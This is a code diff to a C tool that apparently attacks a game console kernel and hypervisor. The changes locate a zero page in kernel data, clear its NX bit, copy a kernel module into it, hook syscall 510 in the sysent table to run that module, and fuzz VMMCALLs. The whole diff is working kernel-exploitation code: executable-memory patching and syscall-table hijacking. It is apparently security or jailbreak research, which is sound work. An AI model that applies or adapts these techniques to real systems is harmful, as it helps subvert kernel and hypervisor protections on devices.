@@ -620,10 +620,24 @@ static int discover_sysent_table(void) {
 
         if (sy_call_0 >= g_ktext_base && sy_call_0 < g_kdata_base &&
             sy_call_1 >= g_ktext_base && sy_call_1 < g_kdata_base) {
+            /* Extra validation: check that target syscall 510 exists
+             * and looks like nosys (sy_call == sysent[0].sy_call) */
+            if ((int)sv_size <= KMOD_SYSCALL_NUM) {
+                printf("[*] Skipping sysentvec at proc+0x%x: sv_size=%u < syscall %d\n",
+                       off, sv_size, KMOD_SYSCALL_NUM);
+                continue;
+            }
+
+            uint64_t target_sy_call;
+            kernel_copyout(sv_table + (KMOD_SYSCALL_NUM * 0x30) + 0x08, &target_sy_call, 8);
+
             printf("[+] Found sysentvec at proc+0x%x: 0x%lx\n", off, candidate);
             printf("[+] PPR sysent table: 0x%lx (sv_size=%u)\n", sv_table, sv_size);
             printf("[+] sysent[0].sy_call=0x%lx sysent[1].sy_call=0x%lx\n",
                    sy_call_0, sy_call_1);
+            printf("[+] sysent[%d].sy_call=0x%lx (nosys=0x%lx, match=%s)\n",
+                   KMOD_SYSCALL_NUM, target_sy_call, sy_call_0,
+                   target_sy_call == sy_call_0 ? "yes" : "NO");
             g_sysent_table = sv_table;
             return 0;
         }
@@ -634,44 +648,48 @@ static int discover_sysent_table(void) {
 }
 
 /*
- * Find a safe code cave in kernel text by scanning for a region
- * of consecutive zero bytes large enough for the kmod binary.
+ * Find a safe data cave in kernel BSS/data by scanning for a
+ * page-aligned region of consecutive zero bytes. We then clear
+ * NX on it to make it executable.
  *
- * Kernel text has alignment padding between sections that's
- * typically filled with zeros. We scan for this.
+ * Unlike kernel text, kernel data has PAs in the low range that
+ * are covered by the DMAP, so clear_nx_for_range will work.
+ *
+ * We start scanning deep into kernel data (past critical structures)
+ * to avoid clobbering anything important. Byepervisor's DATA_CAVE
+ * is around kdata + 0x60C0000 on FW 2.x, so we search a similar range.
  */
-static uint64_t find_code_cave(size_t needed) {
+static uint64_t find_data_cave(size_t needed) {
     uint8_t buf[4096];
-    /* Start after first 256KB (ELF headers, early code) and scan
-     * up to the text-data gap. For FW 4.03, gap is 0xC00000. */
-    uint64_t scan_start = g_ktext_base + 0x40000;
-    uint64_t scan_end = g_kdata_base;
+    /* Scan deep in kernel data where BSS zeros are likely.
+     * Start at kdata + 0x4000000 (~64MB in), end well before
+     * the known structures at kdata + 0x66E74C0 (ROOTVNODE). */
+    uint64_t scan_start = g_kdata_base + 0x4000000;
+    uint64_t scan_end   = g_kdata_base + 0x6400000;
 
-    printf("[*] Scanning ktext for code cave (%lu bytes needed)...\n", needed);
+    printf("[*] Scanning kernel data for data cave (%lu bytes needed)...\n", needed);
     printf("[*] Scan range: 0x%lx - 0x%lx\n", scan_start, scan_end);
 
     for (uint64_t addr = scan_start; addr + 4096 <= scan_end; addr += 4096) {
         kernel_copyout(addr, buf, 4096);
 
-        /* Check for a run of zeros long enough */
-        int run = 0;
+        /* Look for a full page of zeros — safest to use an entire
+         * zero page rather than a partial run */
+        int all_zero = 1;
         for (int i = 0; i < 4096; i++) {
-            if (buf[i] == 0x00 || buf[i] == 0xCC) {
-                run++;
-                if ((size_t)run >= needed + 64) { /* 64 bytes margin */
-                    uint64_t cave = addr + i - run + 33; /* 32-byte aligned */
-                    cave = (cave + 31) & ~31ULL;
-                    printf("[+] Code cave found at 0x%lx (run of %d bytes at page 0x%lx)\n",
-                           cave, run, addr);
-                    return cave;
-                }
-            } else {
-                run = 0;
+            if (buf[i] != 0x00) {
+                all_zero = 0;
+                break;
             }
+        }
+
+        if (all_zero) {
+            printf("[+] Data cave found: full zero page at 0x%lx\n", addr);
+            return addr;
         }
     }
 
-    printf("[-] No suitable code cave found in kernel text\n");
+    printf("[-] No suitable data cave found in kernel data\n");
     return 0;
 }
 
@@ -1251,15 +1269,15 @@ static void campaign_kmod_vmmcall(void) {
     printf("  Campaign 7: Kernel Module VMMCALL Fuzzing\n");
     printf("=============================================\n\n");
 
-    if (!g_dmap_base) {
-        printf("[-] DMAP not available, cannot load kmod\n");
+    if (!g_dmap_base || !g_cr3_phys) {
+        printf("[-] DMAP/CR3 not available, cannot load kmod\n");
         return;
     }
 
     printf("[*] Kmod binary size: %lu bytes\n", KMOD_BIN_SZ);
 
-    /* Allocate userland memory for the result buffer only.
-     * The kmod code will be copied to a kernel code cave. */
+    /* Allocate userland memory for the result buffer.
+     * The kmod code will be copied to a kernel data cave. */
     size_t result_size = sizeof(struct kmod_result_buf);
     size_t result_pages = (result_size + 0x3FFF) & ~0x3FFFULL;
     if (result_pages < 0x4000)
@@ -1295,54 +1313,62 @@ static void campaign_kmod_vmmcall(void) {
            (uint64_t)result_phys, (uint64_t)result_uva);
 
     /*
-     * Find a safe code cave in kernel text by scanning for a
-     * region of zero bytes. Unlike Byepervisor's hardcoded
-     * offset (0x44000), which is FW-specific, this works on
-     * any FW by finding genuinely unused space.
+     * Find a data cave in kernel BSS (page of zeros deep in kdata).
+     * Unlike kernel text, kernel data has PAs in the low range
+     * that the DMAP covers, so we can clear NX on it.
      */
-    printf("\n[*] Step 1: Finding kernel code cave...\n");
-    uint64_t code_cave_va = find_code_cave(KMOD_BIN_SZ);
-    if (!code_cave_va) {
-        printf("[-] No safe code cave found\n");
+    printf("\n[*] Step 1: Finding kernel data cave...\n");
+    uint64_t cave_va = find_data_cave(KMOD_BIN_SZ);
+    if (!cave_va) {
+        printf("[-] No safe data cave found\n");
         return;
     }
 
-    /* Step 2: Copy kmod code to the code cave */
-    printf("\n[*] Step 2: Copying kmod to code cave...\n");
-    kernel_copyin((void *)KMOD_BIN, code_cave_va, KMOD_BIN_SZ);
-    printf("[+] Copied %lu bytes to 0x%lx\n", KMOD_BIN_SZ, code_cave_va);
+    /* Step 2: Clear NX on the data cave page to make it executable.
+     * This works because kernel data PAs are in the low range
+     * covered by the DMAP (unlike ONION memory PAs at ~0x2000000000). */
+    printf("\n[*] Step 2: Clearing NX on data cave page...\n");
+    if (clear_nx_for_range(cave_va, 4096) != 0) {
+        printf("[-] Failed to clear NX on data cave\n");
+        return;
+    }
 
-    /* Verify the copy by reading back first 8 bytes */
+    /* Step 3: Copy kmod code to the data cave */
+    printf("\n[*] Step 3: Copying kmod to data cave...\n");
+    kernel_copyin((void *)KMOD_BIN, cave_va, KMOD_BIN_SZ);
+    printf("[+] Copied %lu bytes to 0x%lx\n", KMOD_BIN_SZ, cave_va);
+
+    /* Verify the copy */
     uint64_t verify;
-    kernel_copyout(code_cave_va, &verify, 8);
+    kernel_copyout(cave_va, &verify, 8);
     uint64_t expected;
     memcpy(&expected, KMOD_BIN, 8);
     if (verify != expected) {
-        printf("[-] Code cave verification failed: got 0x%lx, expected 0x%lx\n",
+        printf("[-] Data cave verification failed: got 0x%lx, expected 0x%lx\n",
                verify, expected);
         return;
     }
-    printf("[+] Code cave verification passed\n");
+    printf("[+] Data cave verification passed\n");
 
-    /* Step 3: Discover the sysent table */
-    printf("\n[*] Step 3: Discovering sysent table...\n");
+    /* Step 4: Discover the sysent table */
+    printf("\n[*] Step 4: Discovering sysent table...\n");
     if (!g_sysent_table && discover_sysent_table() != 0) {
         printf("[-] Failed to discover sysent table\n");
         return;
     }
 
-    /* Step 4: Install the kmod as a custom syscall */
-    printf("\n[*] Step 4: Installing kmod syscall...\n");
-    if (install_kmod_syscall(code_cave_va) != 0) {
+    /* Step 5: Install the kmod as a custom syscall */
+    printf("\n[*] Step 5: Installing kmod syscall...\n");
+    if (install_kmod_syscall(cave_va) != 0) {
         printf("[-] Failed to install kmod syscall\n");
         return;
     }
 
-    /* Step 5: Execute the kmod via syscall
+    /* Step 6: Execute the kmod via syscall
      * Start with MSR recon only (safe, no VMMCALL).
      * The kmod uses STAC/CLAC to access the result buffer
      * at its userland VA, avoiding DMAP PA range issues. */
-    printf("\n[*] Step 5: Executing kmod via syscall %d...\n", KMOD_SYSCALL_NUM);
+    printf("\n[*] Step 6: Executing kmod via syscall %d...\n", KMOD_SYSCALL_NUM);
     printf("    Running MSR reconnaissance (safe, no VMMCALL).\n\n");
 
     /* Pass: dmap_base, result_uva (userland VA), flags (MSR only first) */
@@ -1353,12 +1379,12 @@ static void campaign_kmod_vmmcall(void) {
 
     printf("[*] Kmod syscall returned: %d\n", kmod_ret);
 
-    /* Step 6: Restore the original syscall */
-    printf("\n[*] Step 6: Restoring original syscall...\n");
+    /* Step 7: Restore the original syscall */
+    printf("\n[*] Step 7: Restoring original syscall...\n");
     restore_syscall();
 
     /* Step 5: Read and display results */
-    printf("\n[*] Step 7: Reading results...\n");
+    printf("\n[*] Step 8: Reading results...\n");
 
     if (result_uva->magic != KMOD_MAGIC) {
         printf("[-] Result buffer magic mismatch: expected 0x%llx, got 0x%llx\n",
@@ -1476,10 +1502,10 @@ int main(void) {
     campaign_kernel_recon();
 
     /* Campaign 7: Kernel module VMMCALL fuzzing (highest priority) */
-    if (g_dmap_base) {
+    if (g_dmap_base && g_cr3_phys) {
         campaign_kmod_vmmcall();
     } else {
-        printf("[!] Skipping kmod campaign (no DMAP)\n");
+        printf("[!] Skipping kmod campaign (no DMAP/CR3)\n");
     }
 
     if (g_dmap_base) {
